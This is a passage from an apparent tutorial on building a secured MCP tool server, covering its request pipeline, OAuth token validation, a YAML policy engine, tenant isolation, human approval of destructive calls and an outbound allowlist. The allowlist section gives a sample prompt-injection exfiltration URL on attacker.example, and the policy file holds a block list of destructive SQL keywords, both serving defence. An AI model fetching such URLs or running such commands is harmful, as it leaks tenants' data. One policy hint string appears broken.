1. For `list_tools`, we call `registry.list_visible(tenant=..., scopes=...)`. This means the caller never sees tools they are not allowed to use.
2. An agent with only `tool:postgres:read` scope will not even see `s3.put_object` in the list. This gives a **cleaner context window** and better tool selection from the LLM.
3. For `call_tool`, we wrap the incoming call into a `ToolCallEnvelope` (our normalized internal shape) and dispatch it through the full pipeline.
4. If anything goes wrong, we catch `ToolError` and convert it to the MCP wire format.
5. The agent never sees a Python traceback, only a structured `{code, retryable, hint}` payload.

### Wiring the Request Pipeline

Now the most important method, `_dispatch`. This is **the entire request pipeline**, read top to bottom:

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*DvBvssEtBQsJ_-2x2Zq5NA.png)

Request Pipeline (Created by Fareed Khan )

```c
async def _dispatch(self, envelope: ToolCallEnvelope):
        """The request pipeline. Read it top-to-bottom; it is the whole story."""
        # 5. Validate input against the tool's declared schema.
        tool = self.registry.get(envelope.tool)
        validated_args = tool.validate(envelope.arguments)

  
        # 3. Authorize, tool-level scopes + tenant-scoped ABAC.
        tool.policy.check(envelope.caller, envelope.tenant, validated_args)
        
        # 8. Rate limit, Redis token bucket keyed on tenant + tool.
        await self.limiter.acquire(envelope.tenant, envelope.tool)
        
        # 9. Cache, deterministic hash of (tool, tenant, args).
        cache_key = tool.cache_key(envelope.tenant, validated_args)
        if cached := await self.cache.get(cache_key):
            self.metrics.cache_hit.labels(tool=envelope.tool).inc()
            return cached
        
        # 7. Circuit breaker wraps the actual execution.
        breaker = self.breakers.for_tool(envelope.tool)
        with self.metrics.latency.labels(tool=envelope.tool).time():
            result = await breaker.call(tool.execute, envelope.tenant, validated_args)
        
        # 9 (cont.) write-through on success.
        if tool.cacheable:
            await self.cache.set(cache_key, result, ttl=tool.cache_ttl_seconds)
        
        # 11. Audit log, outside the hot path but before the response returns.
        self.metrics.calls_total.labels(tool=envelope.tool, status="ok").inc()
        return result
```

The order here is not arbitrary. It reflects the dependency order of the twelve components:

1. **Validate first** because a malformed payload should be rejected before we waste a policy evaluation on it.
2. **Authorize before rate limit** because a denied call should not consume the caller’s quota.
3. **Rate limit before cache** because a cache hit for a banned caller is still a leak.
4. **Cache before circuit breaker** because a warm cache can serve during a downstream outage.
5. **Circuit breaker wraps execution** so a broken backend stops cascading immediately.
6. **Metrics and audit outside the hot path** so observability does not slow down the happy path.

We have the startup and shutdown lifecycle hooks to manage connections cleanly:

```c
async def startup(self) -> None:
        init_tracing(self.settings)
        await self.cache.connect()
        await self.limiter.connect()
        await self.registry.discover()
        logger.info("atlas-mcp ready", extra={"tools": len(self.registry)})

async def shutdown(self) -> None:
        await self.cache.disconnect()
        await self.limiter.disconnect()
```

`init_tracing` sets up the OTel exporter. `cache.connect()` opens the Redis pool. `limiter.connect()` loads our Lua script into Redis. `registry.discover()` walks the `tools/` package and registers every tool. And on shutdown we close those connections cleanly so we do not leak sockets on restart.

Now, the HTTP transport. This wraps the MCP server in a Starlette app with middleware:

```c
def build_http_app(server: AtlasServer) -> Starlette:
    """Wraps the MCP server in a Starlette app with all middleware applied."""

    @asynccontextmanager
    async def lifespan(_app: Starlette) -> AsyncIterator[None]:
        await server.startup()
        try:
            yield
        finally:
            await server.shutdown()

    middleware = [
        # Order matters: auth populates identity, then tenant middleware reads it.
        Middleware(AuthMiddleware, settings=server.settings),
        Middleware(TenantMiddleware, settings=server.settings),
    ]

    from mcp.server.streamable_http import StreamableHTTPSessionManager

    session_manager = StreamableHTTPSessionManager(
        app=server.mcp, stateless=server.settings.stateless_mode
    )

    routes = [
        # /.well-known/mcp-server, Component 4: discovery without a live connection.
        Route("/.well-known/mcp-server", endpoint=server.registry.well_known_endpoint),
        Route("/healthz", endpoint=_healthz),
        Route("/readyz", endpoint=_readyz),
        Route("/metrics", endpoint=metrics_endpoint),
        Mount("/mcp", app=session_manager.handle_request),
    ]

    return Starlette(routes=routes, middleware=middleware, lifespan=lifespan)
```

Three important details here.

1. First, the middleware order. `AuthMiddleware` runs before `TenantMiddleware` because tenant information comes from the authenticated Principal. Reversing this order would mean the tenant middleware has no principal to read from.
2. Second, `StreamableHTTPSessionManager(...)`. This is the flag we set in `.env` earlier. In stateless mode, the server does not hold conversation state between requests, which means a load balancer can send any request to any replica. **This is the 2026 MCP roadmap top production fix**.
3. Third, the routes. `/.well-known/mcp-server` is a discovery endpoint for registries that want to know what our server offers without opening a session. `/healthz` and `/readyz` are for Kubernetes liveness and readiness probes. `/metrics` exposes Prometheus metrics. `/mcp` is where the actual MCP protocol traffic goes.

The stdio transport is much simpler, it just wires the MCP server to stdin/stdout:

```c
async def run_stdio(server: AtlasServer) -> None:
    await server.startup()
    try:
        async with stdio_server() as (read, write):
            await server.mcp.run(read, write, server.mcp.create_initialization_options())
    finally:
        await server.shutdown()
```

And finally, the entry point:

```c
def main() -> None:
    logging.basicConfig(level=logging.INFO)
    settings = get_settings()
    server = AtlasServer(settings)

    if settings.transport == "stdio":
        asyncio.run(run_stdio(server))
    else:
        app = build_http_app(server)
        uvicorn.run(app, host=settings.http_host, port=settings.http_port)
```

Based on the `ATLAS_TRANSPORT` setting, we either run the stdio version (for Claude Desktop) or the HTTP version (for remote deployments). Same business logic, two different wire protocols.

So far, we have a transport layer that handles both stdio and HTTP, a stateless session manager that scales horizontally, a well-known discovery endpoint, health probes, and a fully-ordered dispatch pipeline that every tool call flows through.

## Authentication, Policy & Governance

The difference between a demo MCP server and a production one is mostly this layer.

> [**41% of registry MCP servers in 2026**](https://nvd.nist.gov/vuln/detail/CVE-2026-34742) **shipped with no authentication at all**. CVEs followed.

This is where we make sure that does not happen to **Atlas**.

We are going to build four things in this section …

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*m45EPmIT1_5EmKNR4EEpLQ.png)

Authentication, Policy & Governance (Created by Fareed Khan )

1. An **OAuth 2.1 resource server** that validates JWT tokens from an external authorization server.
2. A **policy engine** driven by YAML rules that decides what each principal can do.
3. **Tenant middleware** that pins every request to one and only one tenant.
4. An **approval gate** that holds destructive tool calls until a human reviews them.
5. An **outbound HTTP allowlist** that stops agents from exfiltrating data after a prompt injection.

### OAuth 2.1 as a Resource Server

Normally, beginners make their MCP server issue its own static API keys. This works for a day. Then you need key rotation, scoping, audit trails, revocation, and suddenly you are rebuilding OAuth from scratch but badly.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*DxHMAylHd9Dv2YJ9Ssa3sg.png)

Resource Server (Created by Fareed Khan )

The production pattern is **Atlas-MCP is a resource server, not an authorization server**. Login, consent, client registration, and token issuance all happen at an external provider (WorkOS AuthKit, Auth0, Descope, Keycloak, or your own). Atlas only validates tokens that show up in the `Authorization` header.

Let’s create `src/atlas_mcp/auth/oauth.py`. First, the `Principal` dataclass which represents "who is calling":

```c
"""Component 2, OAuth 2.1 authentication for MCP.

Atlas-MCP acts as an OAuth 2.1 resource server, it does NOT issue tokens.
A dedicated authorization server (Auth0, WorkOS AuthKit, Descope, or your own)
handles login, consent, client registration, and token issuance. Atlas only
validates access tokens that show up in the Authorization header.
"""

from __future__ import annotations

import time
from dataclasses import dataclass
from functools import lru_cache

import httpx
import jwt

from jwt import PyJWKClient
from atlas_mcp.config import ServerSettings
from atlas_mcp.errors.framework import AuthError

@dataclass(frozen=True, slots=True)
class Principal:
    """Who is calling, the result of successful token validation.
    An MCP principal is not a user. It is an *agent* acting with delegated
    authority from a user. The \`\`delegator\`\` attribute identifies the human
    who authorized the agent; \`\`subject\`\` identifies the agent itself.
    """

    subject: str                    # Agent identity, e.g. "agent:claude:abc123"
    delegator: str | None           # Human who authorized the agent
    tenant: str                     # Multi-tenancy scope
    scopes: frozenset[str]          # Tool-level permissions
    token_id: str                   # jti, for revocation and audit
    issued_at: int
    expires_at: int

    def has_scope(self, required: str) -> bool:
        # Scope strings follow \`tool:<name>:<action>\` convention.
        return required in self.scopes or "tool:*:admin" in self.scopes
```

Notice the difference between `subject` and `delegator`. An MCP `Principal` is **not a user**, it is an agent acting with delegated authority.

> The `delegator` is the human who authorized the agent.

This distinction matters because audit logs need to record *both* **"who ran this"** (the agent) and **"who authorized this"** (the human). [**This follows RFC 8693's actor claim pattern**](https://www.rfc-editor.org/rfc/rfc8693.html).

### JWT Validation with JWKS

Next, the `TokenValidator`. This is the hot path, every single request validates a token, so it needs to be fast:

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*zIaHJS89ED2ZSsJyYXrM5A.png)

JWT Validation (Created by Fareed Khan )

```c
class TokenValidator:
    """Validates MCP access tokens against the authorization server's JWKS.

    Uses PyJWKClient's built-in cache for signing keys so we do not refetch
    on every request. Validation is the hot path, keep it fast.
    """

    def __init__(self, settings: ServerSettings):
        self.settings = settings
        self._jwks = PyJWKClient(settings.auth_jwks_url, cache_keys=True, max_cached_keys=16)

    def validate(self, bearer: str) -> Principal:
        try:
            signing_key = self._jwks.get_signing_key_from_jwt(bearer)

            claims = jwt.decode(
                bearer,
                signing_key.key,
                algorithms=["RS256", "ES256"],
                audience=self.settings.auth_audience,
                issuer=self.settings.auth_issuer,
                options={"require": ["exp", "iat", "sub", "jti", "aud", "iss"]},
            )

        except jwt.ExpiredSignatureError as exc:
            raise AuthError("token_expired", retryable=True, hint="refresh your token") from exc

        except jwt.InvalidTokenError as exc:
            raise AuthError("invalid_token", retryable=False, hint=str(exc)) from exc
```

Three things happen here.

1. First, `PyJWKClient(cache_keys=True)` caches the signing keys from the authorization server's JWKS endpoint. Without this, every request would make an HTTP call to fetch the public key, which would kill latency.
2. Second, `jwt.decode` enforces **required claims**: `exp`, `iat`, `sub`, `jti`, `aud`, `iss`. A token missing any of these is rejected. We also pin the `audience` and `issuer` to our server's identity so a token issued for a different service cannot be replayed against us.
3. Third, we translate JWT errors into our `AuthError` with `retryable=True` for expired tokens (the agent can retry after refresh) and `retryable=False` for invalid tokens (no amount of retries will fix a forged signature).

Then we extract the MCP-specific claims:

```c
# MCP-specific claims. The authorization server populates these during
        # the consent flow, they travel with the token as agent metadata.
        scopes = claims.get("scope", "")
        return Principal(
            subject=claims["sub"],
            delegator=claims.get("act", {}).get("sub"),  # RFC 8693 actor claim
            tenant=claims.get("tenant", "default"),
            scopes=frozenset(scopes.split() if isinstance(scopes, str) else scopes),
            token_id=claims["jti"],
            issued_at=claims["iat"],
            expires_at=claims["exp"],
        )

@lru_cache(maxsize=1)
def get_validator(settings: ServerSettings) -> TokenValidator:
    return TokenValidator(settings)
```

The `act.sub` claim is RFC 8693's actor claim, which is how we propagate "the human who authorized this agent" through the token. `tenant` scopes the multi-tenancy boundary. `scopes` is a space-separated string of permissions like `tool:postgres:read tool:vector:read`.

### Auth Middleware Layer

Now we need to actually intercept every request and run the validator. We do this with a Starlette middleware in `src/atlas_mcp/auth/middleware.py`:

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*lDTYA0sgGtFx2HlKSIz_AQ.png)

Auth Middleware Layer (Created by Fareed Khan )

```c
"""Starlette middleware that validates the bearer token on every request.
Reads the \`\`Authorization: Bearer <jwt>\`\` header, calls the token validator,
and stores the resulting Principal on \`\`request.state\`\` for downstream
handlers, tenant middleware, and the dispatch pipeline.
"""

from __future__ import annotations
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request

from starlette.responses import JSONResponse
from atlas_mcp.auth.oauth import get_validator
from atlas_mcp.config import ServerSettings

from atlas_mcp.errors.framework import AuthError

# Endpoints that don't require auth, discovery and liveness are public.
_PUBLIC_PATHS = frozenset({"/.well-known/mcp-server", "/healthz", "/readyz", "/metrics"})

class AuthMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, settings: ServerSettings):
        super().__init__(app)
        self.settings = settings
        self.validator = get_validator(settings)

    async def dispatch(self, request: Request, call_next):

        if request.url.path in _PUBLIC_PATHS:
            return await call_next(request)
        header = request.headers.get("authorization", "")

        if not header.lower().startswith("bearer "):
            return self._unauthenticated("missing_token")
        bearer = header[7:].strip()

        try:
            principal = self.validator.validate(bearer)
        except AuthError as exc:
            return self._unauthenticated(exc.code)

        # Attach to request state so downstream handlers can read identity.
        request.state.principal = principal

        return await call_next(request)
```

The `_PUBLIC_PATHS` set is important. `/.well-known/mcp-server` must be unauthenticated because MCP registries need to discover the server's capabilities before any token exists. `/healthz`, `/readyz`, and `/metrics` must be unauthenticated because Kubernetes liveness probes and Prometheus scrapers do not carry tokens.

For every other path, we demand a `Bearer <jwt>` header, validate it, and attach the resulting `Principal` to `request.state`. Downstream middleware and handlers can read `request.state.principal` to know who is calling.

If validation fails, we return a 401 with a proper `WWW-Authenticate` header so MCP hosts can trigger their OAuth flow:

```c
def _unauthenticated(self, error_code: str) -> JSONResponse:
        return JSONResponse(
            {"error": error_code},
            status_code=401,
            headers={
                "WWW-Authenticate": (
                    f'Bearer realm="{self.settings.auth_audience}", '
                    f'error="{error_code}", '
                    f'authorization_uri="{self.settings.auth_issuer}"'
                )
            },
        )
```

The `WWW-Authenticate` header is RFC 6750 compliant. MCP hosts read the `authorization_uri` and redirect the user to the right OAuth flow. Without this, hosts like Claude Desktop would just fail silently.

### Policy Engine with YAML Rules

> Authentication tells us *who* is calling. Authorization tells us *what they can do*. For that we need a **policy engine**.

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*ylMn3E9b8_kn5qWcdpOuCQ.png)

Policy Engine (Created by Fareed Khan )

**The production approach is to express policies in YAML so ops teams can change them without redeploying**. Each rule binds a subject (or role) to an action on a resource, with optional attribute-based conditions.

Let’s look at `config/policy.yaml` first:

```c
rules:
  # ── Support copilot agents ──────────────────────────────────────
  - id: support-agents-build-context
    subjects: ["role:support_copilot", "role:human_agent"]
    actions: ["tool:postgres:read", "tool:elasticsearch:read", "tool:vector:read"]
    resources: ["tenant:*/*"]

  - id: support-agents-can-read-s3
    subjects: ["role:support_copilot", "role:human_agent"]
    actions: ["tool:s3:read"]
    resources: ["tenant:*/docs/*", "tenant:*/tickets/*"]

  # ── Deny rules (always win) ─────────────────────────────────────
  - id: no-one-can-drop-tables
    subjects: ["*"]
    actions: ["tool:postgres:read", "tool:postgres:write"]
    resources: ["*"]
    conditions:
      sql_contains_any: ["DROP", "TRUNCATE", "GRANT", "REVOKE"]
    effect: deny

  - id: no-pii-columns-for-support-agents
    subjects: ["role:support_copilot"]
    actions: ["tool:postgres:read"]
    resources: ["*"]
    conditions:
      pii_fields: ["ssn", "tax_id", "dob", "credit_card_number"]
    effect: deny
```

The DSL is narrow on purpose. Only two conditions exist:

1. `sql_contains_any` which rejects queries containing banned keywords, and `pii_fields` which rejects queries requesting sensitive columns.
2. A policy DSL that can express anything is one that nobody understands six months later.

Deny rules always win. Even if a support copilot has a broad allow rule for postgres reads, the `no-one-can-drop-tables` deny rule blocks any SQL containing `DROP`. This is defense against prompt injection at the policy layer.

Now the engine itself in `src/atlas_mcp/auth/policy.py`:

```c
"""Component 3, Policy engine.
The engine is deny-by-default. The absence of an \`\`allow\`\` rule is a denial.
"""

from __future__ import annotations
from dataclasses import dataclass

from pathlib import Path
from typing import Any, Literal

import yaml
from atlas_mcp.errors.framework import PolicyError

@dataclass(frozen=True, slots=True)
class Rule:
    id: str
    subjects: tuple[str, ...]
    actions: tuple[str, ...]
    resources: tuple[str, ...]
    effect: Literal["allow", "deny"] = "allow"
    conditions: dict[str, Any] = None  # type: ignore[assignment]

class PolicyEngine:
    """Evaluates rules in order; deny beats allow beats default-deny."""

    def __init__(self, rules: list[Rule], default_deny: bool = True):
        self.rules = rules
        self.default_deny = default_deny

    @classmethod
    def from_file(cls, path: str | Path, default_deny: bool = True) -> "PolicyEngine":
        data = yaml.safe_load(Path(path).read_text())
        rules = [
            Rule(
                id=r["id"],
                subjects=tuple(r.get("subjects", [])),
                actions=tuple(r.get("actions", [])),
                resources=tuple(r.get("resources", [])),
                effect=r.get("effect", "allow"),
                conditions=r.get("conditions"),
            )
            for r in data.get("rules", [])
        ]

        return cls(rules, default_deny=default_deny)
```

The `Rule` is an immutable dataclass. The engine loads rules from the YAML file, parses them into `Rule` instances, and holds them in a list. `default_deny=True` is our safety net, no explicit allow means denial.

The core evaluation logic:

```c
def check(self, subject: str, tenant: str, action: str, resource: str, context: dict) -> None:
        """Raise PolicyError if the call is not allowed.

        Matching rules are partitioned into allow and deny. Deny always wins.
        If no allow rule matches and default_deny is on, the call is rejected.
        """

        matched_allow: list[Rule] = []
        matched_deny: list[Rule] = []

        for rule in self.rules:
            if not self._matches(rule, subject, action, f"tenant:{tenant}/{resource}"):
                continue
            if rule.conditions and not self._conditions_match(rule.conditions, context):
                continue
            (matched_deny if rule.effect == "deny" else matched_allow).append(rule)

        if matched_deny:
            raise PolicyError(
                "denied_by_policy",
                retryable=False,
                hint=f"rule id
 denies this action",
            )

        if not matched_allow and self.default_deny:
            raise PolicyError(
                "not_authorized",
                retryable=False,
                hint=f"no policy rule allows {action} on {resource}",
            )
```

The logic reads cleanly:

1. Walk every rule, check if the `(subject, action, resource)` triple matches.
2. If the rule has conditions, check those too.
3. Partition matches into allow and deny buckets.
4. **Deny wins immediately**. If any deny rule matches, reject with a `PolicyError`.
5. **Default deny wins if no allow matches**. No allow rule = no permission.

The `hint` in the error message tells the agent *which rule* blocked them, which is useful for debugging but does not leak sensitive rule internals.

The pattern matching uses simple glob semantics:

```c
@staticmethod
    def _matches(rule: Rule, subject: str, action: str, resource: str) -> bool:
        return (
            _glob_any(rule.subjects, subject)
            and _glob_any(rule.actions, action)
            and _glob_any(rule.resources, resource)
        )

@staticmethod
    def _conditions_match(conditions: dict, context: dict) -> bool:
        # Narrow DSL: only a handful of operators. Easy to audit.
        for key, value in conditions.items():
            if key == "sql_contains_any":
                sql = (context.get("sql") or "").upper()
                if any(needle.upper() in sql for needle in value):
                    return True
                return False
            if key == "pii_fields":
                requested = set(context.get("columns", []))
                if requested & set(value):
                    return True
                return False
            # Unknown conditions fail closed.
            return False
        return True

def _glob_any(patterns: tuple[str, ...], value: str) -> bool:
    """Supports trailing-star globs and bare \`*\` wildcard."""
    for pat in patterns:
        if pat == "*" or pat == value:
            return True
        if pat.endswith("*") and value.startswith(pat[:-1]):
            return True
    return False
```

Three things worth pointing out …

1. First, the glob is deliberately limited (exact match, trailing star, or bare `*`). No full regex, no complex expressions.
2. Second, `_conditions_match` is a switch over known condition names with explicit handlers. Adding a new condition type is a code change, not a config change, which is what you want for security-sensitive logic.
3. Third, the default for unknown conditions is `False`, we **fail closed**.

### Tenant Middleware & Isolation

Authentication gives us a `Principal` with a `tenant` claim. Now we need to pin every request to that tenant before any business logic runs. We do this in `src/atlas_mcp/governance/tenant.py`:

![](https://miro.medium.com/v2/resize:fit:4800/format:webp/1*WJ0FLi0wN0Bw-gtgE4b9_Q.png)

Tenant Middleware (Created by Fareed Khan )

```c
"""Component 12, Multi-tenancy boundary.

Asana's MCP-powered feature leaked customer data across 1,000 organisations
because tenancy was an afterthought. Atlas bakes it in at the middleware
layer so no code path can escape the boundary.
Three sources of tenant information, in priority order:
1. The \`\`tenant\`\` claim on the authenticated Principal. This is the only
   source that cannot be spoofed by the caller.
2. An explicit \`\`X-Tenant-Id\`\` header, allowed only when the Principal has
   the \`\`tenant:*:impersonate\`\` scope (used by internal admin tools).
3. \`\`"default"\`\` when tenancy is disabled by settings.
"""

from __future__ import annotations

from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request
from starlette.responses import JSONResponse

from atlas_mcp.config import ServerSettings

_EXEMPT_PATHS = frozenset({"/.well-known/mcp-server", "/healthz", "/readyz", "/metrics"})

class TenantMiddleware(BaseHTTPMiddleware):

    def __init__(self, app, settings: ServerSettings):
        super().__init__(app)
        self.settings = settings

    async def dispatch(self, request: Request, call_next):
        if request.url.path in _EXEMPT_PATHS:
            return await call_next(request)

        principal = getattr(request.state, "principal", None)

        if principal is None and self.settings.require_tenant:
            return JSONResponse({"error": "no_principal"}, status_code=401)

        # Start from the token's tenant claim.
        tenant = principal.tenant if principal is not None else "default"

        # Impersonation: allow an X-Tenant-Id header if the scope permits.
        header_tenant = request.headers.get(self.settings.tenant_header)

        if header_tenant and header_tenant != tenant:
            if principal is None or not principal.has_scope("tenant:*:impersonate"):
                return JSONResponse(
                    {"error": "tenant_mismatch"},
                    status_code=403,
                )
            tenant = header_tenant

        request.state.tenant = tenant

        return await call_next(request)
```

The logic is short but every line matters.

1. The **tenant comes from the JWT claim first**. This is the only source that cannot be spoofed because the token is signed by the authorization server. We do not trust headers for tenant identity by default.
2. **Header-based impersonation is allowed only if the principal has** `**tenant:*:impersonate**` **scope**. This scope is given only to internal admin tools that need to investigate a specific customer's data. If a regular agent sends `X-Tenant-Id: othertenant`, we return a 403.

After this middleware, every downstream handler can read `request.state.tenant` and be confident it is the right tenant for this request.

The dispatch pipeline passes this into the tool, which passes it into the database layer, which passes it into the RLS policy we wrote in section 2.

> Tenancy is enforced at **four layers**: JWT claim, middleware, tool code, and database RLS.

### Human in the Loop Approval Gates

Most agents should be read-only. But eventually you want an agent that can write, refund, email, or publish.

> The question is: how do you let it do that without betting the company on its judgment?

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*AiC7C9ABJ5WmWKchZgjnoA.png)

Human in loop (Created by Fareed Khan )

The answer is **human in the loop approvals**. Destructive tool calls do not execute immediately. They create a pending approval record in Redis and return a structured error to the agent. A human operator reviews the pending record in a dashboard and approves or denies it. Only then can the agent proceed.

Let’s create `src/atlas_mcp/governance/approval.py`:

```c
"""Component 12, Human-in-the-loop approval gate.

Destructive tool calls (writes, deletes, payments, emails) do not execute
immediately. They create a pending approval record in Redis and return a
structured \`\`pending_approval\`\` error to the agent. A human operator reviews
the pending record in a dashboard and approves or denies it; the agent can
then call \`\`approval.resume\`\` with the approval id.
"""

from __future__ import annotations

import json
import uuid

from dataclasses import asdict, dataclass
from datetime import datetime, timezone

from typing import Any, Literal

from redis.asyncio import Redis
from atlas_mcp.errors.framework import PolicyError, ToolError

APPROVAL_TTL_SECONDS = 3600  # An unreviewed approval expires in one hour.

@dataclass
class PendingApproval:
    id: str
    tenant: str
    caller: str
    delegator: str | None
    tool: str
    arguments: dict[str, Any]
    created_at: str
    state: Literal["pending", "approved", "denied", "expired"] = "pending"

class PendingApprovalError(ToolError):
    """Raised to signal the agent that human approval is required."""

    def __init__(self, approval: PendingApproval):
        super().__init__(
            code="pending_approval",
            retryable=False,
            hint=(
                f"tool {approval.tool!r} requires human approval; "
                f"approval_id={approval.id}. "
                "Surface the approval id to the user and wait."
            ),
            context={"approval_id": approval.id, "tool": approval.tool},
        )
```

The `PendingApprovalError` is `retryable=False` because retrying without action will not change the outcome, the human still has not approved. The `hint` tells the agent to surface the approval id to the user so they know there is something to review.

Now the gate itself:

```c
class ApprovalGate:
    """Creates pending approvals and checks their state on resume."""

    def __init__(self, redis: Redis):
        self._redis = redis

    async def request(self, *, tenant: str, caller: str, delegator: str | None,
                      tool: str, arguments: dict[str, Any]) -> PendingApproval:
        approval = PendingApproval(
            id=uuid.uuid4().hex,
            tenant=tenant,
            caller=caller,
            delegator=delegator,
            tool=tool,
            arguments=arguments,
            created_at=datetime.now(timezone.utc).isoformat(),
        )

        key = self._key(approval.id)

        await self._redis.set(key, json.dumps(asdict(approval)), ex=APPROVAL_TTL_SECONDS)
        return approval

    async def check(self, approval_id: str, expected_tenant: str) -> PendingApproval:
        """Look up an approval and enforce that the tenant matches."""
        raw = await self._redis.get(self._key(approval_id))
        if raw is None:
            raise PolicyError(
                "approval_not_found",
                retryable=False,
                hint=f"approval {approval_id!r} does not exist or has expired",
            )

        approval = PendingApproval(**json.loads(raw))

        if approval.tenant != expected_tenant:
            raise PolicyError(
                "approval_tenant_mismatch",
                retryable=False,
                hint="approval belongs to a different tenant",
            )

        return approval
```

A few things to notice …

1. `request()` creates a new pending approval, stores it in Redis with a 1-hour TTL, and returns it. The TTL means an unreviewed approval self-destructs after an hour, so Redis does not fill up with abandoned requests.
2. `check()` enforces that **the tenant of the approval must match the expected tenant**. This prevents an attacker with access to one tenant's API from using another tenant's approval id to run a destructive operation.

The approve and deny methods:

```c
async def approve(self, approval_id: str, approver: str) -> PendingApproval:
        approval = await self._load(approval_id)
        approval.state = "approved"
        await self._save(approval, add_approver=approver)
        return approval

async def deny(self, approval_id: str, approver: str) -> PendingApproval:
        approval = await self._load(approval_id)
        approval.state = "denied"
        await self._save(approval, add_approver=approver)
        return approval
```

Both record *who* approved or denied. This goes into the audit log, which is critical for compliance. If an auditor asks “who approved the refund for customer X”, we need to answer.

**This is the pattern that lets you ship write-capable agents without betting the company …**

> It mirrors what Claude Code, Cursor, and Copilot do for file edits. The confirmation step is not optional ceremony, it is the control surface.

### Outbound HTTP Allowlisting

The final governance layer. Even if an agent has legitimate access to an `http.fetch` tool, we do not want it calling arbitrary URLs. A successful prompt injection that convinces the agent to fetch `https://attacker.example/exfil?data=...` is a data leak.

> The solution is a **per-tenant outbound allowlist.**

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*41CJoSSabWspdQsg69utRw.png)

Outbound HTTP Allowlisting (Created by Fareed Khan )

Every tenant declares which hostnames their agents are allowed to hit. Anything else is blocked.

Let’s create `config/http_allowlist.yaml`:

```c
# Per-tenant outbound HTTP allowlist.
#
# Hostnames can be exact (e.g. \`api.stripe.com\`) or wildcards (e.g.
# \`*.acme.internal\`). An agent attempting to reach any other host gets a
# policy error, this is the primary defence against exfiltration via
# prompt injection.

"*":
  # Hosts that every tenant can hit.
  - api.company-status-page.internal

acme:
  - api.stripe.com
  - api.sendgrid.com
  - "*.acme.internal"

globex:
  - api.twilio.com
  - "*.globex.internal"
```

The `"*"` key is a global allowlist, hosts every tenant can hit. Then each tenant has its own entry with tenant-specific hosts. Wildcards like `*.acme.internal` let entire internal subdomains be reachable without listing every service.

This file is loaded by the HTTP fetch tool at startup (we will build that tool in section 6). If the allowlist file is missing, the loaded map is empty, which means **no outbound HTTP is permitted**. That is deliberately the safe default.

So far, we have built a complete security layer: OAuth 2.1 token validation, a YAML-driven policy engine with deny-by-default, tenant middleware with optional admin impersonation, a Redis-backed approval gate for destructive operations, and a per-tenant outbound HTTP allowlist.

**Every request now passes through authentication, authorization, tenant scoping, and policy conditions before it reaches any tool.**

## Structured Error Framework

> Now we need to talk about something that sounds boring but is actually the difference between an agent that recovers gracefully and one that spirals into nonsense: **error handling**.

![](https://miro.medium.com/v2/resize:fit:2000/format:webp/1*KMmw4VZTuJiV4E_BZNOFvQ.png)

Structured Error Framework (Created by Fareed Khan )

Normally, when a tool call fails in a typical Python API, you get a traceback. The traceback lands in your logs, and humans read it.

But **agents cannot recover from Python tracebacks**. They cannot recover from plain English error strings either. If your Postgres tool returns **“connection refused”**, a GPT-4 agent will probably retry the exact same query. And again. And again. Because nothing in that error told the model whether retrying will help.

What agents *can* recover from is **structured errors**, a small, stable vocabulary that tells the agent three things:

1. **What went wrong** (a machine-readable `code`).
2. **Whether retrying will help** (a `retryable` boolean).
3. **What to try differently** (a `hint` string).

This pattern is called **SERF** (Structured Error Recovery Framework), and it is one of the most high-leverage things you can add to an MCP server. Let’s build it.

Create `src/atlas_mcp/errors/framework.py`. First, the base class:

```c
"""Component 10, Structured Error Recovery Framework.

Agents cannot recover from Python tracebacks. They cannot recover from plain
English error strings either. What they can recover from is structured
errors, a small, stable vocabulary that tells the agent:
* what went wrong (code),
* whether retrying will help (retryable),
* and what to try differently (hint).
Every other component in Atlas-MCP raises one of these error types; nothing
else leaks to the agent.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Any

from mcp.types import ErrorData

@dataclass
class ToolError(Exception):
    """Base class for every error Atlas-MCP surfaces to an agent."""
    code: str
    retryable: bool = False
    hint: str | None = None
    context: dict[str, Any] | None = None

    def __str__(self) -> str:
        return f"{self.code}: {self.hint or ''}"

    def to_dict(self) -> dict[str, Any]:
        return {
            "code": self.code,
            "retryable": self.retryable,
            "hint": self.hint,
            "context": self.context or {},
        }
```

The `ToolError` is a dataclass that inherits from `Exception`. It has four fields: `code` (the machine-readable identifier), `retryable` (whether the agent should try again), `hint` (the human-readable suggestion), and `context` (extra structured data for advanced agents).

The `to_dict()` method is important because we will serialize this into the MCP wire format shortly.

Now we define a **flat, fixed taxonomy** of error types. Every error the server can surface is one of these:

```c
class AuthError(ToolError):
    """Token missing, expired, or invalid."""

class PolicyError(ToolError):
    """The caller is authenticated but not permitted."""

class ValidationError(ToolError):
    """Input failed schema or constraint validation."""

class RateLimitError(ToolError):
    """Per-tenant or per-tool quota exceeded."""
    def __init__(self, retry_after_seconds: float, hint: str | None = None):
        super().__init__(
            code="rate_limited",
            retryable=True,
            hint=hint or f"retry after {retry_after_seconds:.1f}s",
            context={"retry_after_seconds": retry_after_seconds},
        )
```

The `RateLimitError` is a good example of structured error design. It is **always retryable** (that is not up to the raiser), and it carries the `retry_after_seconds` in both the `hint` (human-readable) and the `context` (machine-readable). An agent that understands SERF can read `context["retry_after_seconds"]` and back off the exact right amount.

Notice that we did **not** give `RateLimitError` a flexible constructor. The retryable flag is hardcoded to `True` because a rate limit is *by definition* retryable. This kind of forcing function matters, we do not want future engineers passing `retryable=False` by mistake.

Next, the upstream and circuit-related errors:

```c
class UpstreamError(ToolError):
    """An upstream system (Postgres, Elasticsearch, S3) failed.

    \`\`retryable\`\` is True for transient failures (timeout, 503) and False for
    deterministic failures (syntax error, 400). The agent uses this to decide
    whether to re-issue the same call or back off.
    """

class CircuitOpenError(ToolError):
    """Circuit breaker is open, stop calling this tool for now."""

    def __init__(self, tool: str, recovery_seconds: int):
        super().__init__(
            code="circuit_open",
            retryable=True,
            hint=f"tool {tool!r} is temporarily disabled; retry after {recovery_seconds}s",
            context={"tool": tool, "recovery_seconds": recovery_seconds},
        )

class TimeoutError_(ToolError):  # trailing underscore avoids shadowing builtin
